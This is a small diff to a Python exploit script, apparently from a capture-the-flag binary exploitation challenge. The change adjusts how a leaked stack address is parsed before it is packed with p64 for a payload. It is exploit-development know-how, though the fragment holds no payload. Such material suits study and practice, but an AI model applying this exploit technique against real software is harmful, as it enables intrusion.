@@ -46,7 +46,7 @@ print conn.recvline()
 # The program is nice enough to give us the address of the beginning of the stack
 location = conn.recvline()
 print location
-location = int(location.split(":")[1],16)
+location = int(location.split(":")[1][2:],16)
 address = p64(location)
 # -- OR --
 # location = int(r.recv(14),16)
